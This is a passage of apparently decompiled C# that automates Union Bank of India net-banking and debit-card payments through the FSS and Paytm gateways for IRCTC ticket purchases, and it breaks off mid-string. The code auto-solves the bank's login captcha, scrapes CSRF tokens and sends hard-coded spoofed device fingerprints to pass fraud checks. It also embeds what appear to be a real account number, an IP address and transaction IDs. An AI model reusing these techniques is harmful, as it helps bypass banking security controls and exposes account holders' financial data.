                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessUnionDebit", ex.Message);
                    result = false;
                }
                finally
                {
                    bool_27 = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with UNION Payment";
            clsMain.Lock("Html doesn't contains fssnet.co.in, returning.");
            return false;
        }

        private bool method_136(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessUnionNB.");
            try
            {
                string string_91 = "";
                string_89 = "";
                string text = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string str = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string string_92 = "";
                string text4 = "";
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    text4 = array2[0];
                    string_92 = array2[1];
                }
                else
                {
                    text4 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                }
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                if (string_86.Contains("https://www.unionbankonline.co.in"))
                {
                    string_91 = string_86;
                }
                else
                {
                    if (!string_86.Contains("fssnet.co.in"))
                    {
                        string_90 = "Some thing went wrong with Union NB Payment";
                        clsMain.Lock("Html doesn't contains fssnet.co.in, returning.");
                    }
                    string text5 = text4.Substring(text4.IndexOf("=") + 1);
                    clsMain.Lock("First Hit Inp = " + text4);
                    if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "UnionNB Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_91);
                    text = string_92;
                    int startIndex = string_91.IndexOf("function encrypData");
                    startIndex = string_91.IndexOf("var paymentId", startIndex);
                    startIndex = string_91.IndexOf("\"", startIndex) + 1;
                    int length = string_91.IndexOf("\"", startIndex) - startIndex;
                    string text6 = string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    startIndex = string_91.IndexOf("var encCaptcha");
                    startIndex = string_91.IndexOf("\"", startIndex) + 1;
                    length = string_91.IndexOf("\"", startIndex) - startIndex;
                    string text7 = string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    startIndex = string_91.IndexOf("CSRFToken", startIndex);
                    startIndex = string_91.IndexOf("lue=\"", startIndex) + 5;
                    length = string_91.IndexOf("\"", startIndex) - startIndex;
                    string text8 = string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    startIndex = string_91.IndexOf("name=\"paymentId\"", startIndex);
                    startIndex = string_91.IndexOf("lue='", startIndex) + 5;
                    length = string_91.IndexOf("'", startIndex) - startIndex;
                    string text9 = string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    startIndex = string_91.IndexOf("mrchWeb", startIndex);
                    startIndex = string_91.IndexOf("lue='", startIndex) + 5;
                    length = string_91.IndexOf("'", startIndex) - startIndex;
                    string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    startIndex = string_91.IndexOf("mrchTrackId", startIndex);
                    startIndex = string_91.IndexOf("lue='", startIndex) + 5;
                    length = string_91.IndexOf("'", startIndex) - startIndex;
                    string text10 = string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    startIndex = string_91.IndexOf("mrchErrUrl", startIndex);
                    startIndex = string_91.IndexOf("lue='", startIndex) + 5;
                    length = string_91.IndexOf("'", startIndex) - startIndex;
                    string_91.Substring(startIndex, length).Replace("'", "").Trim();
                    string text11 = DateTime.Now.ToString("ddd MMM dd HH:mm:ss IST yyyy");
                    string string_94 = text6 + text7 + "00AA83WP0" + text11 + text9 + "file:////fss50/axisbank/Config/ipay/instupd/14/INSTITUTION/CSS/style.css/fss50/axisbank/Config/ipay/instupd/14/INSTITUTION/Header/UBI.jpg//fss50//axisbank//Config//ipay//instupd//14//INSTITUTION//PropFile//label.propertiesIRCTC CRIShttps://irctc.co.in" + text10 + "010100Union Bank of Indiahttps://www.irctc.co.in/eticketing/BankResponse0036140143614000DD//fss50//PGWAYF//config////brands//default///footer.html";
                    string string_95 = Class12.smethod_22(text8).ToString().ToUpper();
                    string text12 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_94, string_95).ToString().ToUpper()).ToString().ToUpper(), string_95).ToString().ToUpper();
                    text12 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpTW9udGglNUVkZWJpWWVhciU1RWNhcmRQaW5UeXBlJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI%3D";
                    text4 = "paymentIdKey=" + text6 + "&hdndivType=&encCaptcha=" + text7.Replace("=", "%3D") + "&cspg=" + text12.Replace("^", "%5E") + "&CSRFToken=" + text8 + "&debitCardNumber=&debiMonth=0&debiYear=0&debitCardholderName=&cardPinType=A&cardPin=&cardCvd2pin=&passline=A83WP&gstnTXNId=&gstnFlag=0&paymentInitTime=" + HttpUtility.UrlEncode(text11) + "&paymentId=" + text9 + "&styleCss=file%3A%2F%2F%2F%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F14%2FINSTITUTION%2FCSS%2Fstyle.css&headerFile=%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F14%2FINSTITUTION%2FHeader%2FUBI.jpg&labelFile=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Finstupd%2F%2F14%2F%2FINSTITUTION%2F%2FPropFile%2F%2Flabel.properties&mrchName=IRCTC+CRIS&mrchWeb=https%3A%2F%2Firctc.co.in&mrchTrackId=" + text10 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=1&ecomFlg=0&captchaFlg=0&instName=Union+Bank+of+India&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=36140&instId=14&mrchId=36140&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=&creditDebitCheck=DD&debitYear=&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2F%2Ffss50%2F%2FPGWAYF%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2F%2Ffooter.html";
                    text = "https://securepayments.fssnet.co.in/pgwayf/paymentpage.htm";
                    string_92 = "https://securepayments.fssnet.co.in/pgwayf/paymentrouter.htm";
                    clsMain.Lock("Second Hit Inp = " + text4);
                    if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("Second Hit Failed. err = " + string_93);
                        string_90 = "Failed while making Payment.";
                        return false;
                    }
                    clsMain.Lock("Second Hit output = " + string_91);
                    string_92 = "https://securepayments.fssnet.co.in/pgwayf/directdebit.htm?actionparam=merchantRequest";
                    text = "https://securepayments.fssnet.co.in/pgwayf/paymentrouter.htm";
                    text4 = "PaymentID=" + text5 + "&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse";
                    clsMain.Lock("Third Hit Inp = " + text4);
                    if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("Third Hit Failed. err = " + string_93);
                        string_90 = "Union NB Not Working - Payment Failed";
                        return false;
                    }
                }
                clsMain.Lock("Third Output htm = " + string_91);
                if (!string.IsNullOrEmpty(string_91.Trim()) && string_91.Contains("unionbankonline"))
                {
                    text4 = class3_0.Method_SerialInp(string_91, ref string_92, false);
                    clsMain.Lock("Second Hit Inp = " + text4);
                    if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("Second Hit Failed. err = " + string_93);
                        string_90 = "UBI NB Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("Second Output htm = " + string_91);
                    text4 = class3_0.Method_SerialInp(string_91, ref string_92, false);
                    clsMain.Lock("Second Hit Inp = " + text4);
                    if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("Second Hit Failed. err = " + string_93);
                        string_90 = "UBI NB Not Working - Payment Failed";
                        return false;
                    }
                    int num = 0;
                    while (true)
                    {
                        num++;
                        string text13 = string_91.Substring(string_91.IndexOf("captchaquestionstyle"));
                        text13 = text13.Substring(text13.IndexOf("/>") + 2);
                        text13 = text13.Substring(0, text13.IndexOf("?"));
                        string string_96 = "";
                        if (!text13.Contains("+"))
                        {
                            if (text13.Contains("smallest") || text13.Contains("largest"))
                            {
                                string[] array3 = text13.Substring(text13.IndexOf("value") + 6).Replace("?", "").Trim()
                                    .Split(',');
                                int num2 = int.Parse(array3[0]);
                                for (int i = 1; i < array3.Length; i++)
                                {
                                    if (text13.Contains("smallest"))
                                    {
                                        if (num2 > int.Parse(array3[i]))
                                        {
                                            num2 = int.Parse(array3[i]);
                                        }
                                    }
                                    else if (num2 < int.Parse(array3[i]))
                                    {
                                        num2 = int.Parse(array3[i]);
                                    }
                                }
                                string_96 = num2.ToString();
                            }
                        }
                        else
                        {
                            string[] array4 = text13.Replace("What is the result of", "").Replace("?", "").Trim()
                                .Split('+');
                            string_96 = (int.Parse(array4[0]) + int.Parse(array4[1])).ToString();
                        }
                        string text14 = string_91.Substring(string_91.IndexOf("LoginHDisplay.Ra15"));
                        text14 = text14.Substring(text14.IndexOf("img src=") + 9);
                        text14 = text14.Substring(0, text14.IndexOf("\""));
                        clsMain.Lock("Second Output htm = " + string_91);
                        if (string_91.Contains("Union Bank of India - Log in to Internet Banking"))
                        {
                            text4 = class3_0.Method_SerialInp(string_91, ref string_92, false);
                            text4 = text4.Replace("buffer=&pp_=&pp_=&alp_=&pp_caps=&pp_caps=&pp_erase=&pp_clear=&", "");
                            int startIndex2 = string_91.IndexOf("<form");
                            startIndex2 = string_91.IndexOf("action", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            int length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string_92 = "https://www.unionbankonline.co.in/corp/" + string_91.Substring(startIndex2, length2);
                            text4 = clsPostData.SetPost(text4, "AuthenticationFG.USER_PRINCIPAL", HttpUtility.UrlEncode(str));
                            text4 = clsPostData.SetPost(text4, "AuthenticationFG.VERIFICATION_CODE", string_96);
                            text4 = clsPostData.SetPost(text4, "JS_ENABLED_FLAG", "Y");
                            text4 += "&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F69.0.3497.100+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22106.220.88.145%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D449137%3Bldi%3D246%3Bmesc%3D422706%3Bldi%3D231%22%2C%22DESC%22%3A%22%22%7D&executionTime=1292&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D449137%3Bldi%3D246%3Bmesc%3D422706%3Bldi%3D231&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=&DEVICE_ID=null&DEVICE_TYPE=DEVICEID.HTTP&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F69.0.3497.100+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22106.220.88.145%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D449137%3Bldi%3D246%3Bmesc%3D422706%3Bldi%3D231%22%2C%22DESC%22%3A%22%22%7D";
                            clsMain.Lock("Second Hit Inp = " + text4);
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                break;
                            }
                            clsMain.Lock("Second Output htm = " + string_91);
                            startIndex2 = string_91.IndexOf("AuthenticationFG.ACCESS_CODE");
                            if (startIndex2 <= 0)
                            {
                                if (num > 3)
                                {
                                    string_90 = "UBI NB Not Working - Payment Failed";
                                    return false;
                                }
                                continue;
                            }
                            string text15 = "https://www.unionbankonline.co.in/corp/";
                            startIndex2 = string_91.IndexOf("<form");
                            startIndex2 = string_91.IndexOf("action", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            text4 = class3_0.Method_SerialInp(string_91, ref string_92, false);
                            text4 = text4.Replace("pp_=&pp_=&alp_=&pp_caps=&pp_caps=&pp_erase=&pp_clear=&", "").Replace("&Action.BACK=Back", "");
                            string_92 = text15 + string_91.Substring(startIndex2, length2);
                            string str2 = text4.Substring(text4.IndexOf("KEY__") + 6);
                            str2 = HttpUtility.UrlDecode(str2);
                            text4 = clsPostData.SetPost(text4, "__JS_ENCRYPT_KEY__", "");
                            string text16 = "";
                            string text17 = "UNION1";
                            updateTStatus_2?.Invoke(1005, text17 + "||" + text2 + "||" + str2, "");
                            if (clsMain.dictionary_5.ContainsKey(text17))
                            {
                                object obj = new object();
                                object obj2 = obj;
                                lock (obj2)
                                {
                                    text16 = clsMain.dictionary_5[text17];
                                    method_61("Encrypted Data, out = " + text16);
                                    clsMain.dictionary_5.Remove(text17);
                                }
                            }
                            text4 = clsPostData.SetPost(text4, "AuthenticationFG.ACCESS_CODE", text16);
                            text4 = clsPostData.SetPost(text4, "JS_ENABLED_FLAG", "Y");
                            text4 = clsPostData.SetPost(text4, "DECRYPT_FLAG", "Y");
                            text4 += "&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F69.0.3497.100+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22106.220.88.145%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D449137%3Bldi%3D246%3Bmesc%3D422706%3Bldi%3D231%22%2C%22DESC%22%3A%22%22%7D&executionTime=1292&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D449137%3Bldi%3D246%3Bmesc%3D422706%3Bldi%3D231&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=&DEVICE_ID=null&DEVICE_TYPE=DEVICEID.HTTP&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F69.0.3497.100+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22106.220.88.145%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D449137%3Bldi%3D246%3Bmesc%3D422706%3Bldi%3D231%22%2C%22DESC%22%3A%22%22%7D";
                            clsMain.Lock("Url=" + string_92 + "     referer=" + text);
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Third Output htm = " + string_91);
                            if (!string_91.Contains("Initiate Payment"))
                            {
                                string_90 = "Failed while processing payment.";
                                if (string_91.IndexOf("Invalid Login ID or Password.", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    string_90 = "Invalid Login ID or Password.";
                                }
                                clsMain.Lock("Third Hit Failed. Check HTML");
                                return false;
                            }
                            string string_97 = "";
                            string string_98 = "";
                            startIndex2 = string_91.IndexOf("3CINPTW.png");
                            startIndex2 = string_91.IndexOf("baseUrl", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            text = string_92;
                            string_92 = text15 + string_91.Substring(startIndex2, length2);
                            text4 = "criteria={\"WID_CONF\":\"PageConfigurationMaster_CIMSHPW__1\",\"PARENT_MENU_FOR_REMOVE\":\"CIMSHP\",\"GROUPLETS_IN_PAGE\":\"%2CPageConfigurationMaster_CIMSHPW__1\"}&target=PageConfigurationMaster_CIMSHPW__1&requestId=0";
                            startIndex2 = string_91.IndexOf("w49.png");
                            startIndex2 = string_91.IndexOf("baseUrl", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string string_99 = text15 + string_91.Substring(startIndex2, length2);
                            string string_100 = "criteria={\"WID_CONF\":\"PageConfigurationMaster_W49__1\",\"PARENT_MENU_FOR_REMOVE\":\"CIMSHP\",\"GROUPLETS_IN_PAGE\":\"%2CPageConfigurationMaster_CIMSHPW__1%2CPageConfigurationMaster_W49__1\"}&target=PageConfigurationMaster_W49__1&requestId=0";
                            clsMain.Lock("Fourth Hit Url=" + string_92 + "     referer=" + text);
                            string_71 = "X-Requested-With=XMLHttpRequest&requestId=0";
                            if (!_Request(string_92, text4, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_91, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fourth Output htm = " + string_91);
                            string_71 = "X-Requested-With=XMLHttpRequest&requestId=0";
                            if (!_Request(string_99, string_100, text, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                string_90 = "Union NB Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Fourth Output htm = " + string_91);
                            string string_101 = "<form name=\"AuthenticationFG\" method=\"post\" action=\"https://www.unionbankonline.co.in/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=026&AuthenticationFG.USER_TYPE=1&AuthenticationFG.TAX_MNU_ID=CIMSHP&AuthenticationFG.CALL_MODE=2&CATEGORY_ID=SHP&RU=https://securegw.paytm.in/instaproxy/bankresponse/UNI/NB/RESP/&QS=XXJt1sfFgH42aDbauaUS8BXcjLS%2FCVixrKVvJORhuLldcm3Wx8WAfjZoNtq5pRLwl%2FkQwMboKWlJqsK2i%2B9H3gc8vVArbcFTCdzmo8h2fcJzGkYiyxUPlOv6UC8T5ZoC%0D%0AK6S%2FHv4lAIHUoixA0F7WucYqDLhq8crHQt5kdEkZDTYHWW%2FmDVXCXYI04m%2B7jxesxe5SSSAW3BsGTk0WKJb5zJFrQgZEY0vqrwrOMYN8Ixen%2FqZ4EDkiXFbY0iAwvYk5d5QT%0D%0AKQ%2FdTByDN8UBze2FaOQj5ynBD0MlAlorcbABEyJ%2BcYI%2Fz%2B%2FVMudK%2B047PPSm\"> \n" + string_91 + "</form>";
                            startIndex2 = string_91.IndexOf("Pay From Account");
                            startIndex2 = string_91.IndexOf("selected", startIndex2);
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string text18 = string_91.Substring(startIndex2, length2);
                            startIndex2 = string_91.IndexOf("formAction");
                            startIndex2 = string_91.IndexOf("\"", startIndex2) + 1;
                            length2 = string_91.IndexOf("\"", startIndex2) - startIndex2;
                            string_92 = text15 + string_91.Substring(startIndex2, length2);
                            text4 = "TranRequestManagerFG.REC_FREQ=1&TranRequestManagerFG.FREQ_IN_DAYS=&TranRequestManagerFG.TXN_DATE=02%2F08%2F2019&TranRequestManagerFG.TOT_NO_INST=&TranRequestManagerFG.END_DATE=&TranRequestManagerFG.LAST_PMT_AMT=&TranRequestManagerFG.INITOR_ACCOUNT=591602010008028&TranRequestManagerFG.REPORT_CODE_DR=&TranRequestManagerFG.DESTINATION_TYPE=M&TranRequestManagerFG.REPORT_CODE_CR=&TranRequestManagerFG.TXN_CRN=INR&TranRequestManagerFG.ENT_REMARKS=&FG_BUTTONS__=ADDNL_INFO%2CADD_ENTRY_WITH_ADDNL_DETAIL%2CSAVE_AS_TEMPLATE%2CSAVE_TRANSACTION_ADDN_DETAILS%2CCONTINUE_TXN_WITH_ADDN_DET%2CFREQ_TYPE_GO%2CVIEW_OWN_ACNT_DET%2CLOOK_UP%2CADD_COUNTER_PARTY%2CCHECK_COUNTER_RATE%2CBACK_TO_ACTION%2CBACK_FOR_CP&TranRequestManagerFG.SINGLE_FREQ_TYPE=O&TranRequestManagerFG.SINGLE_NWK_TYP=WIB&TranRequestManagerFG.SINGLE_TRAN_PURPOSE=&TranRequestManagerFG.TXN_TYPE=SHP&FreqTypeFilterValue=O&FrequencyTypeFGValue=O&TranRequestManagerFG.CP_ADDRESS=Address1&GROUPLET_FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.VAL_IND=N&TranRequestManagerFG.RETURN_URL=https%3A%2F%2Fsecuregw.paytm.in%2Finstaproxy%2Fbankresponse%2FUNI%2FNB%2FRESP%2F&TranRequestManagerFG.TXN_AMT_SHP=32.29&TranRequestManagerFG.TXN_CRN_SHP=INR&TranRequestManagerFG.TXN_PID_SHP=000000036133&TranRequestManagerFG.TXN_PRN_SHP=20190731055160386776&TranRequestManagerFG.TXN_ITC_SHP=IRCTCn13407115805523&TranRequestManagerFG.USER_TYPE=1&TranRequestManagerFG.SHP_CURRENT_DATE=2019-08-02 15%3A58%3A29.597&TranRequestManagerFG.BENEFICIARY_REFERENCE=BNF&TranRequestManagerFG.REPORTTITLE=InitiatePaymentUX3&ReportCode=N&ReportCode2=&RIA_TARGETS=TranRequestManagerFG.INTER_BANK%2CHREF_TranRequestManagerFG.INTMDRY_BANKNAME%2CHREF_TranRequestManagerFG.INTMDRY_BRANCHNAME%2CHREF_TranRequestManagerFG.INTMDRY_ADDR%2CHREF_TranRequestManagerFG.INTMDRY_CITY_ZIP%2CHREF_TranRequestManagerFG.INTMDRY_COUNTRY_DESC%2CHREF_TranRequestManagerFG.INTMDRY_CLEARING_CODE%2CTranRequestManagerFG.INTMDRY_COUNTRY%2CHREF_TranRequestManagerFG.INTER_BANK_CODE%2C%2C%2CTranRequestManagerFG.INTER_BANK%2CHREF_TranRequestManagerFG.INTMDRY_BANKNAME%2CHREF_TranRequestManagerFG.INTMDRY_BRANCHNAME%2CHREF_TranRequestManagerFG.INTMDRY_ADDR%2CHREF_TranRequestManagerFG.INTMDRY_CITY_ZIP%2CHREF_TranRequestManagerFG.INTMDRY_COUNTRY_DESC%2CHREF_TranRequestManagerFG.INTMDRY_CLEARING_CODE%2CTranRequestManagerFG.INTMDRY_COUNTRY%2CHREF_TranRequestManagerFG.INTER_BANK_CODE%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_FXD_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR%2C%2C%2CTranRequestManagerFG.NEGOTIATED_RATE_VAR_CRN%2CTranRequestManagerFG.NEG